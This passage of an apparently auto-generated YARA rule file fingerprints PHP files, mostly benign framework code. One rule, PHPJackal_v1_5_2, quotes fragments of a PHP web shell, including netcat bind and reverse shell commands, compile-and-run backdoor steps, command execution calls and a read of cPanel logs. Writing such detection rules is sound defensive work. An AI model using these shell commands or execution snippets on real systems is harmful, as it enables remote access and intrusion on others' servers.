      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule PercentageGenerationPolicySpec
{
   meta:
      description = "php22 - file PercentageGenerationPolicySpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "875ff22174af37dc8af7a33fc5f8e5c5fb66fad33c807cad313d2ccb5e3564b9"
   strings:
      $s1 = "$this->shouldThrow(\\InvalidArgumentException::class)->during('getPossibleGenerationAmount', [$instruction]);" fullword ascii
      $s2 = "use Sylius\\Component\\Promotion\\Generator\\PromotionCouponGeneratorInstructionInterface;" fullword ascii
      $s3 = "$this->getPossibleGenerationAmount($instruction)->shouldReturn(7);" fullword ascii
      $s4 = "use Sylius\\Component\\Promotion\\Repository\\PromotionCouponRepositoryInterface;" fullword ascii
      $s5 = "$instruction->getCodeLength()->willReturn(null);" fullword ascii
      $s6 = "use Sylius\\Component\\Promotion\\Generator\\GenerationPolicyInterface;" fullword ascii
      $s7 = "$instruction->getCodeLength()->willReturn(1);" fullword ascii
      $s8 = "$instruction->getAmount()->willReturn(null);" fullword ascii
      $s9 = "$instruction->getAmount()->willReturn(18);" fullword ascii
      $s10 = "$instruction->getAmount()->willReturn(17);" fullword ascii
      $s11 = "namespace spec\\Sylius\\Component\\Promotion\\Generator;" fullword ascii
      $s12 = "function it_throws_an_invalid_argument_exception_when_expecte_code_length_is_null(" fullword ascii
      $s13 = "function it_throws_an_invalid_argument_exception_when_expected_amount_is_null(" fullword ascii
      $s14 = "function let(PromotionCouponRepositoryInterface $couponRepository): void" fullword ascii
      $s15 = "$this->shouldThrow(\\InvalidArgumentException::class)->during('isGenerationPossible', [$instruction]);" fullword ascii
      $s16 = "$this->isGenerationPossible($instruction)->shouldReturn(false);" fullword ascii
      $s17 = "function it_implements_a_generator_validator_interface(): void" fullword ascii
      $s18 = "PromotionCouponGeneratorInstructionInterface $instruction" fullword ascii
      $s19 = "PromotionCouponGeneratorInstructionInterface $instruction," fullword ascii
      $s20 = "$couponRepository->countByCodeLength(1)->willReturn(1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule PropertyAccessorCollectionTest
{
   meta:
      description = "php22 - file PropertyAccessorCollectionTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0f7289451469a39d589fba897ce18e17b744f4750b393ee8ed7c0ed141f29f6e"
   strings:
      $s1 = "* @expectedExceptionMessageRegExp /Could not determine access type for property \"axes\" in class \"Mock_PropertyAccessorColle" fullword ascii
      $s2 = "* @expectedException \\Symfony\\Component\\PropertyAccess\\Exception\\NoSuchPropertyException" fullword ascii
      $s3 = "$axesAfter = $this->getContainer(array(0 => 'first', 1 => 'second', 2 => 'third'));" fullword ascii
      $s4 = "$axesMerged = $this->getContainer(array(1 => 'first', 2 => 'second', 3 => 'third'));" fullword ascii
      $s5 = "$axesBefore = $this->getContainer(array(1 => 'second', 3 => 'fourth', 4 => 'fifth'));" fullword ascii
      $s6 = "$axesAfter = $this->getContainer(array(1 => 'second', 5 => 'first', 6 => 'third'));" fullword ascii
      $s7 = "$axesBefore = $this->getContainer(array(1 => 'second', 3 => 'fourth'));" fullword ascii
      $s8 = "public function testSetValueFailsIfAdderAndRemoverExistButValueIsNotTraversable()" fullword ascii
      $s9 = "$car = $this->getMockBuilder(__CLASS__.'_CompositeCar')->getMock();" fullword ascii
      $s10 = "public function testSetValueFailsIfNoAdderNorRemoverFound()" fullword ascii
      $s11 = "$car = $this->getMockBuilder(__CLASS__.'_CarNoAdderAndRemover')->getMock();" fullword ascii
      $s12 = "$structure = $this->getMockBuilder(__CLASS__.'_CarStructure')->getMock();" fullword ascii
      $s13 = "namespace Symfony\\Component\\PropertyAccess\\Tests;" fullword ascii
      $s14 = "$car = $this->getMockBuilder(__CLASS__.'_CarOnlyAdder')->getMock();" fullword ascii
      $s15 = "$car = $this->getMockBuilder(__CLASS__.'_CarOnlyRemover')->getMock();" fullword ascii
      $s16 = "$axesMergedCopy = is_object($axesMerged) ? clone $axesMerged : $axesMerged;" fullword ascii
      $s17 = "foreach ($this->axes as $key => $value) {" fullword ascii
      $s18 = "public function testIsWritableReturnsFalseIfNoAdderNorRemoverExists()" fullword ascii
      $s19 = "public function getStructure()" fullword ascii
      $s20 = "public function getAxes()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule PagePath
{
   meta:
      description = "php22 - file PagePath.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffc834de45b4315a0b14ea633f0a145ecaaada8d7714224918c7ed3f5ecccf8e"
   strings:
      $s1 = "$this->cID = ($c->getCollectionPointerOriginalID() > 0) ? $c->getCollectionPointerOriginalID() : $c->getCollectionID();" fullword ascii
      $s2 = "* @ORM\\Column(type=\"integer\", options={\"unsigned\": true})" fullword ascii
      $s3 = "* @ORM\\GeneratedValue(strategy=\"IDENTITY\")" fullword ascii
      $s4 = "* @ORM\\Id @ORM\\Column(type=\"integer\")" fullword ascii
      $s5 = "* @ORM\\Column(type=\"boolean\")" fullword ascii
      $s6 = "*     @ORM\\Index(name=\"ppIsCanonical\", columns={\"ppIsCanonical\"})," fullword ascii
      $s7 = "* @ORM\\Column(type=\"text\")" fullword ascii
      $s8 = "* @ORM\\GeneratedValue" fullword ascii
      $s9 = "* @ORM\\Table(" fullword ascii
      $s10 = "* @ORM\\Entity" fullword ascii
      $s11 = "*     @ORM\\Index(name=\"cID\", columns={\"cID\"})" fullword ascii
      $s12 = "public function getCollectionID()" fullword ascii
      $s13 = "public function setPagePathIsAutoGenerated($ppGeneratedFromURLSlugs)" fullword ascii
      $s14 = "public function getPagePathID()" fullword ascii
      $s15 = "public function getPagePath()" fullword ascii
      $s16 = "$this->ppGeneratedFromURLSlugs = $ppGeneratedFromURLSlugs;" fullword ascii
      $s17 = "public function setPagePathIsCanonical($ppIsCanonical)" fullword ascii
      $s18 = "use Doctrine\\ORM\\Mapping as ORM;" fullword ascii
      $s19 = "namespace Concrete\\Core\\Entity\\Page;" fullword ascii
      $s20 = "*     name=\"PagePaths\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule QueueOptionsInterface
{
   meta:
      description = "php22 - file QueueOptionsInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1307ba29ba42d56975b0045b3234241405959d23936fd526056dd3befc6f7f10"
   strings:
      $s1 = "* @package PHPDaemon\\Clients\\AMQP\\Driver\\Protocol" fullword ascii
      $s2 = "* @author Aleksey I. Kuleshov YOU GLOBAL LIMITED" fullword ascii
      $s3 = "* Interface QueueOptionsInterface" fullword ascii
      $s4 = "namespace PHPDaemon\\Clients\\AMQP\\Driver\\Protocol;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PHPJackal_v1_5_2
{
   meta:
      description = "php22 - file PHPJackal_v1.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25c54b4fb107d0a730e1bc2f30924bff05b588419479b50b193e7d13178b69fd"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule OneToManyFormatter
{
   meta:
      description = "php22 - file OneToManyFormatter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9158cc051bf2fd31f96d1b0528d2a347cb9b82c17e12c6d07bd78725e68edc69"
   strings:
      $s1 = "namespace Concrete\\Core\\Express\\Association\\Formatter;" fullword ascii
      $s2 = "public function getTypeDisplayName()" fullword ascii
      $s3 = "public function getIcon()" fullword ascii
      $s4 = "return '<i class=\"fa fa-cube\"></i><i class=\"fa fa-arrow-right\"></i> <i class=\"fa fa-cubes\"></i>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule OutputFormatterStyle
{
   meta:
      description = "php22 - file OutputFormatterStyle.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b9ff3f7846c4113d56a1ff6d66a63f1d4549c47d4d582a12b3631c53235f3781"
   strings:
      $s1 = "* @author Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s2 = "return sprintf(\"\\033[%sm%s\\033[%sm\", implode(';', $setCodes), $text, implode(';', $unsetCodes));" fullword ascii
      $s3 = "* @param string|null $foreground The style foreground color name" fullword ascii
      $s4 = "* @throws InvalidArgumentException When the color name isn't defined" fullword ascii
      $s5 = "* @param string|null $background The style background color name" fullword ascii
      $s6 = "* @throws InvalidArgumentException When the option name isn't defined" fullword ascii
      $s7 = "* @param string|null $color The color name" fullword ascii
      $s8 = "public function __construct(string $foreground = null, string $background = null, array $options = array())" fullword ascii
      $s9 = "* Unsets some specific style option." fullword ascii
      $s10 = "* Sets some specific style option." fullword ascii
      $s11 = "* Initializes output formatter style." fullword ascii
      $s12 = "* Applies the style to a given text." fullword ascii
      $s13 = "* @param string $text The text to style" fullword ascii
      $s14 = "* @param string $option The option name" fullword ascii
      $s15 = "'Invalid foreground color specified: \"%s\". Expected one of (%s)'," fullword ascii
      $s16 = "'Invalid background color specified: \"%s\". Expected one of (%s)'," fullword ascii
      $s17 = "use Symfony\\Component\\Console\\Exception\\InvalidArgumentException;" fullword ascii
      $s18 = "* Sets style foreground color." fullword ascii
      $s19 = "* Sets style background color." fullword ascii
      $s20 = "implode(', ', array_keys(static::$availableBackgroundColors))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule ObjectManagerAwareInterface
{
   meta:
      description = "php22 - file ObjectManagerAwareInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ba76808f4c365b6b77789a48623459acae26af2c5bcf9e4bdbd7f79b49f38940"
   strings:
      $s1 = "* Get the object manager" fullword ascii
      $s2 = "* @param ObjectManager $objectManager" fullword ascii
      $s3 = "* Set the object manager" fullword ascii
      $s4 = "* @return ObjectManager" fullword ascii
      $s5 = "public function getObjectManager();" fullword ascii
      $s6 = "use Doctrine\\Common\\Persistence\\ObjectManager;" fullword ascii
      $s7 = "public function setObjectManager(ObjectManager $objectManager);" fullword ascii
      $s8 = "namespace DoctrineModule\\Persistence;" fullword ascii
      $s9 = "interface ObjectManagerAwareInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PermissionCest
{
   meta:
      description = "php22 - file PermissionCest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7df1b802761d9d8bb5e9ebe88bd046d0ca898ee00a65896fc12e7436cbfeddf1"
   strings:
      $s1 = "$I->setGroupPermission(3, new \\humhub\\modules\\admin\\permissions\\ManageUsers());" fullword ascii
      $s2 = "$I->wantTo('ensure that the manage users permission works as expected');" fullword ascii
      $s3 = "$I->dontSee('Users', '#admin-menu');" fullword ascii
      $s4 = "$I->see('Users', '#admin-menu');" fullword ascii
      $s5 = "public function testCanManageUsers(FunctionalTester $I)" fullword ascii
      $s6 = "$I->setGroupPermission(3, new \\humhub\\modules\\admin\\permissions\\ManageGroups());" fullword ascii
      $s7 = "$I->setGroupPermission(3, new \\humhub\\modules\\admin\\permissions\\ManageSettings());" fullword ascii
      $s8 = "$I->amOnPage(['/space/manage', 'sguid' => '5396d499-20d6-4233-800b-c6c86e5fa34c']);" fullword ascii
      $s9 = "$I->expectTo('see edit user profile view');" fullword ascii
      $s10 = "$I->amOnPage(['/admin/user/edit', 'id' => 1]);" fullword ascii
      $s11 = "$I->wantTo('ensure that see admin information permission works');" fullword ascii
      $s12 = "$I->amGoingTo('try to access admin page without any permissions');" fullword ascii
      $s13 = "public function testSeeAdminInformation(FunctionalTester $I)" fullword ascii
      $s14 = "use humhub\\modules\\admin\\permissions\\SeeAdminInformation;" fullword ascii
      $s15 = "$I->wantTo('ensure that see manage groups permission works');" fullword ascii
      $s16 = "$I->amOnPage(['/admin/user-profile']);" fullword ascii
      $s17 = "$I->see('You are not permitted to access this section.');" fullword ascii
      $s18 = "$I->dontSee('You are not permitted to access this section.');" fullword ascii
      $s19 = "$I->see('User Settings');" fullword ascii
      $s20 = "$I->see('User administration');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule replies_blade
{
   meta:
      description = "php22 - file replies.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d71fc1ce8aba37f7022dad90923b109c3f6af652fc5d7dc2f18ff53b6d5d09e"
   strings:
      $s1 = "<a class=\"fa fa-reply btn-reply2reply\" data-floor={{ $index + 1 }} data-username=\"{{ $reply->user->username }}\" href" fullword ascii
      $s2 = "<img class=\"media-object img-thumbnail avatar\" alt=\"{!! $reply->user->username !!}\" src=\"{!! $reply->user->avatar_small " fullword ascii
      $s3 = "<a class=\"fa fa-trash-o\" id=\"reply-delete-{!! $reply->id !!}\" data-method=\"delete\"  href=\"javascript:void(0);\" data-" fullword ascii
      $s4 = "@if (Auth::user() && (Auth::user()->can(\"manage_threads\") || Auth::user()->id == $reply->user_id) )" fullword ascii
      $s5 = "<a name=\"reply{!! $thread->replyFloorFromIndex($index) !!}\" class=\"anchor\" href=\"#reply{!! $thread->replyFloorFromIndex(" fullword ascii
      $s6 = "<a href=\"{!! route('user.show', [$reply->user_id]) !!}\" title=\"{!! $reply->user->username !!}\" class=\"remove-padding-lef" fullword ascii
      $s7 = "$index) !!}\" aria-hidden=\"true\">#{!! $thread->replyFloorFromIndex($index) !!}</a>" fullword ascii
      $s8 = "url=\"{!! route('reply.destroy', [$reply->id]) !!}\" title=\"{!! trans('forms.delete') !!}\"></a>" fullword ascii
      $s9 = "<a class=\"likeable fa fa-thumbs-o-up\" data-action=\"like\" data-url=\"{{ route('like.store') }}\" data-type=\"Reply\" data-i" fullword ascii
      $s10 = "<a href=\"{!! route('user.show', [$reply->user_id]) !!}\">" fullword ascii
      $s11 = "{!! $reply->user->username !!}\"></a>" fullword ascii
      $s12 = "<div class=\"media-body markdown-reply content-body\">" fullword ascii
      $s13 = "<abbr class=\"timeago\" title=\"{!! $reply->created_at !!}\">{!! $reply->created_at !!}</abbr>" fullword ascii
      $s14 = "{!! $reply->user->username !!}" fullword ascii
      $s15 = "<li class=\"list-group-item media {{ $reply->highlight }}\" id=\"reply{{$reply->id}}\">" fullword ascii
      $s16 = "!!}\"  style=\"width:48px;height:48px;\"/>" fullword ascii
      $s17 = "<div class=\"media-heading meta\">" fullword ascii
      $s18 = "@foreach ($replies as $index => $reply)" fullword ascii
      $s19 = "t author\">" fullword ascii
      $s20 = "\"> {!! $reply->like_count ?: '' !!}" fullword ascii
   condition:
      uint16(0) == 0x753c and filesize < 6KB and
      8 of them
}


rule ProductFactoryInterface
{
   meta:
      description = "php22 - file ProductFactoryInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "664f13a621cec94d8943353e1a889107099b24f7ead7327f8013de0e3a926a52"
   strings:
      $s1 = "use Sylius\\Component\\Resource\\Factory\\TranslatableFactoryInterface;" fullword ascii
      $s2 = "* @return ProductInterface" fullword ascii
      $s3 = "use Sylius\\Component\\Product\\Model\\ProductInterface;" fullword ascii
      $s4 = "namespace Sylius\\Component\\Product\\Factory;" fullword ascii
      $s5 = "interface ProductFactoryInterface extends TranslatableFactoryInterface" fullword ascii
      $s6 = "public function createWithVariant(): ProductInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule OrderPaymentMethodEligibilityValidator
{
   meta:
      description = "php22 - file OrderPaymentMethodEligibilityValidator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c2becd5126e4a0d6edf3a624518ceeccc469a002251afd080f579e584cdd9066"
   strings:
      $s1 = "['%paymentMethodName%' => $payment->getMethod()->getName()]" fullword ascii
      $s2 = "if (!$payment->getMethod()->isEnabled()) {" fullword ascii
      $s3 = "$payments = $order->getPayments();" fullword ascii
      $s4 = "public function validate($order, Constraint $constraint): void" fullword ascii
      $s5 = "use Symfony\\Component\\Validator\\ConstraintValidator;" fullword ascii
      $s6 = "use Symfony\\Component\\Validator\\Constraint;" fullword ascii
      $s7 = "namespace Sylius\\Bundle\\CoreBundle\\Validator\\Constraints;" fullword ascii
      $s8 = "final class OrderPaymentMethodEligibilityValidator extends ConstraintValidator" fullword ascii
      $s9 = "foreach ($payments as $payment) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule ProviderFactory
{
   meta:
      description = "php22 - file ProviderFactory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9c46228eb81ded9040f35cdc2e3a2b941d5758cdc2426398a5c6356f98e66f8b"
   strings:
      $s1 = "namespace ScriptFUSION\\Porter\\Provider;" fullword ascii
      $s2 = "throw new ObjectNotCreatedException(\"Factory does not know how to create: \\\"$name\\\".\");" fullword ascii
      $s3 = "public function createProvider($name)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RedactorController
{
   meta:
      description = "php22 - file RedactorController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0c143297f70778ddb11461facffad4904b121698b64ee6901d154299f66a45ad"
   strings:
      $s1 = "//            if (file_put_contents($this->getFilePath($filename), base64_decode($data))) {" fullword ascii
      $s2 = "$fileInstance = UploadedFile::getInstanceByName('file');" fullword ascii
      $s3 = "//        $contentType = Yii::$app->request->post('contentType');" fullword ascii
      $s4 = "//        return $this->uploadUrl . '/' . $this->getOwnerPath() . '/' . $fileName;" fullword ascii
      $s5 = "//        $mimeTypes = require(Yii::getAlias('@yii/helpers/mimeTypes.php'));" fullword ascii
      $s6 = "//        if (FileHelper::createDirectory($path . DIRECTORY_SEPARATOR . $this->getOwnerPath())) {" fullword ascii
      $s7 = "private function getResponse($fileName)" fullword ascii
      $s8 = "y_search($contentType, $mimeTypes) : 'png';" fullword ascii
      $s9 = "return $this->getResponse($file);" fullword ascii
      $s10 = "public $uploadDir = '@webroot/uploads';" fullword ascii
      $s11 = "//            return $path . DIRECTORY_SEPARATOR . $this->getOwnerPath();" fullword ascii
      $s12 = "return ['error' => 'Unable to save image file'];" fullword ascii
      $s13 = "//                $url = $this->getUrl(pathinfo($filePath, PATHINFO_BASENAME));" fullword ascii
      $s14 = "//        return $this->getSaveDir() . DIRECTORY_SEPARATOR . $fileName;" fullword ascii
      $s15 = "//            $path = Yii::getAlias($this->uploadDir);" fullword ascii
      $s16 = "//        $filesPath = FileHelper::findFiles($this->getSaveDir(), [" fullword ascii
      $s17 = "//            throw new HttpException(403, 'This action allow only ajaxRequest');" fullword ascii
      $s18 = "$file = Image::upload($fileInstance, $dir);" fullword ascii
      $s19 = "public $controllerNamespace = 'yii\\redactor\\controllers';" fullword ascii
      $s20 = "class RedactorController extends \\yii\\easyii\\components\\Controller" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule privilegeService
{
   meta:
      description = "php22 - file privilegeService.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e12f8cfffa059a051ca074c3de9a387017c315c87fb231a35aa469793eff4d96"
   strings:
      $s1 = "TXApp::$base->request->redirect('/login/');" fullword ascii
      $s2 = "public function login_required($action)" fullword ascii
      $s3 = "* @param $action \\app\\controller\\baseAction" fullword ascii
      $s4 = "//            echo $action->display('main/login');" fullword ascii
      $s5 = "* User: billge" fullword ascii
      $s6 = "* Created by PhpStorm." fullword ascii
      $s7 = "TXApp::$base->session->lastUrl = $_SERVER['REQUEST_URI'];" fullword ascii
      $s8 = "use biny\\lib\\TXService;" fullword ascii
      $s9 = "* Date: 16-8-18" fullword ascii
      $s10 = "private function checkUser()" fullword ascii
      $s11 = "private function error($msg='" fullword ascii
      $s12 = "* @param $msg" fullword ascii
      $s13 = "* Time: " fullword ascii
      $s14 = "public function my_required($action, $key)" fullword ascii
      $s15 = "private $_errors;" fullword ascii
      $s16 = "class privilegeService extends TXService" fullword ascii
      $s17 = "$user = TXApp::$model->person;" fullword ascii
      $s18 = "if (!$this->checkUser()){" fullword ascii
      $s19 = "private function correct()" fullword ascii
      $s20 = "$this->_errors = $msg;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule Renderable
{
   meta:
      description = "php22 - file Renderable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5dcc874405c48464359dc081d459b0ca2e543c61f3be676e3290154090d0003"
   strings:
      $s1 = "* Get the evaluated contents of the object." fullword ascii
      $s2 = "namespace Illuminate\\Contracts\\Support;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule optimization
{
   meta:
      description = "php22 - file optimization.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "84e9e543458d3d6b00e21d96f63f66e6865c9ff9339ec3cec0cd99178c97b622"
   strings:
      $s1 = "* Dashboard view - automatically redirects to a default" fullword ascii
      $s2 = "namespace Concrete\\Controller\\SinglePage\\Dashboard\\System;" fullword ascii
      $s3 = "use Concrete\\Core\\Page\\Controller\\DashboardPageController;" fullword ascii
      $s4 = "* page in the category." fullword ascii
      $s5 = "$this->redirect('/dashboard/system/optimization/cache');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PersistableInterface
{
   meta:
      description = "php22 - file PersistableInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c44501bf86062bc4426da59328915e2110348212330277eacb967593abe6efd"
   strings:
      $s1 = "* @link       http://cartalyst.com" fullword ascii
      $s2 = "* This source file is subject to the 3-clause BSD License that is" fullword ascii
      $s3 = "* Returns the persistable key value." fullword ascii
      $s4 = "* Returns the persistable key name." fullword ascii
      $s5 = "* bundled with this package in the LICENSE file." fullword ascii
      $s6 = "* Returns the persistable relationship name." fullword ascii
      $s7 = "* Licensed under the 3-clause BSD License." fullword ascii
      $s8 = "public function getPersistableKey();" fullword ascii
      $s9 = "* Generates a random persist code." fullword ascii
      $s10 = "* @copyright  (c) 2011-2017, Cartalyst LLC" fullword ascii
      $s11 = "* Part of the Sentinel package." fullword ascii
      $s12 = "public function getPersistableRelationship();" fullword ascii
      $s13 = "* NOTICE OF LICENSE" fullword ascii
      $s14 = "public function getPersistableId();" fullword ascii
      $s15 = "* @version    2.0.17" fullword ascii
      $s16 = "* @license    BSD License (3-clause)" fullword ascii
      $s17 = "* @author     Cartalyst LLC" fullword ascii
      $s18 = "* @package    Sentinel" fullword ascii
      $s19 = "public function generatePersistenceCode();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule RecursiveTransformer
{
   meta:
      description = "php22 - file RecursiveTransformer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9681e029ff136b24943896b07ae603c476c9d27c82d9e58d539031615ebc4e5c"
   strings:
      $s1 = "* @throws TransformationFailedException" fullword ascii
      $s2 = "use Symfony\\Component\\Form\\Exception\\TransformationFailedException;" fullword ascii
      $s3 = "* @param DataTransformerInterface $decoratedTransformer" fullword ascii
      $s4 = "private function assertTransformationValueType($value, string $expectedType): void" fullword ascii
      $s5 = "* @param string $expectedType" fullword ascii
      $s6 = "* @var DataTransformerInterface" fullword ascii
      $s7 = "public function __construct(DataTransformerInterface $decoratedTransformer)" fullword ascii
      $s8 = "use Doctrine\\Common\\Collections\\ArrayCollection;" fullword ascii
      $s9 = "use Symfony\\Component\\Form\\DataTransformerInterface;" fullword ascii
      $s10 = "namespace Sylius\\Bundle\\ResourceBundle\\Form\\DataTransformer;" fullword ascii
      $s11 = "public function reverseTransform($values): Collection" fullword ascii
      $s12 = "use Doctrine\\Common\\Collections\\Collection;" fullword ascii
      $s13 = "throw new TransformationFailedException(" fullword ascii
      $s14 = "return $this->decoratedTransformer->reverseTransform($value);" fullword ascii
      $s15 = "public function transform($values): Collection" fullword ascii
      $s16 = "'Expected \"%s\", but got \"%s\"'," fullword ascii
      $s17 = "$this->assertTransformationValueType($values, Collection::class);" fullword ascii
      $s18 = "return $this->decoratedTransformer->transform($value);" fullword ascii
      $s19 = "$this->decoratedTransformer = $decoratedTransformer;" fullword ascii
      $s20 = "private $decoratedTransformer;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}


rule post_meta_values
{
   meta:
      description = "php22 - file post-meta-values.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "946b1ba7ed0c9219df2e7653fa51a8c082d95c37dba3e4a61fb7992545db805c"
   strings:
      $s1 = "?>_custom_post_meta_value\" value=\"<?php echo $post_meta_value;?>\" style=\"<?php echo $display_input;?> width:350px\">" fullword ascii
      $s2 = "$meta_keys = $wpdb->get_results( \"SELECT meta_key FROM $wpdb->postmeta\", ARRAY_A );" fullword ascii
      $s3 = "<option value=\"<?php echo $meta;?>\" <?php selected( $post_meta_value, $meta );?>><?php echo $meta;?></option>" fullword ascii
      $s4 = "<option value=\"custom\" <?php selected($custom, true);?>>- Custom -></option>" fullword ascii
      $s5 = "$field_process = $reg_field['process_field'];" fullword ascii
      $s6 = "add_action( 'ninja_forms_edit_field_after_registered', 'ninja_forms_post_meta_value_box' );" fullword ascii
      $s7 = "if ( isset ( $form_row['data']['create_post'] ) AND $form_row['data']['create_post'] == 1 ) {" fullword ascii
      $s8 = "<select name=\"\" id=\"ninja_forms_field_<?php echo $field_id;?>_post_meta_value\" class=\"ninja-forms-post-meta-value\">" fullword ascii
      $s9 = "<div class=\" description description-wide\" id=\"ninja_forms_post_meta_values\">" fullword ascii
      $s10 = "if( $field_process ){" fullword ascii
      $s11 = "$add_field = apply_filters( 'ninja_forms_use_post_fields', false );" fullword ascii
      $s12 = "<?php _e( 'Attach this value to custom post meta', 'ninja-forms' );?>:" fullword ascii
      $s13 = "$form_row = ninja_forms_get_form_by_field_id( $field_id );" fullword ascii
      $s14 = "function ninja_forms_post_meta_value_box( $field_id ){" fullword ascii
      $s15 = "$field_row = ninja_forms_get_field_by_id($field_id);" fullword ascii
      $s16 = "$post_meta_value = $field_data['post_meta_value'];" fullword ascii
      $s17 = "if( isset( $field_data['post_meta_value'] ) ){" fullword ascii
      $s18 = "if( $post_meta_value == $meta ){" fullword ascii
      $s19 = "$first_char = substr( $key['meta_key'], 0, 1 );" fullword ascii
      $s20 = "array_push( $meta_array, $key['meta_key'] );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}


rule PurgeCommandTest
{
   meta:
      description = "php22 - file PurgeCommandTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "47af3b54c9aba442300b3062be6ea4cb8d253f5ee94c1c07d41643625d1b494e"
   strings:
      $s1 = "$this->assertTrue($definition->getArgument('name')->isRequired()); // Name is required to find the service" fullword ascii
      $s2 = "* testInputsDefinitionCommand" fullword ascii
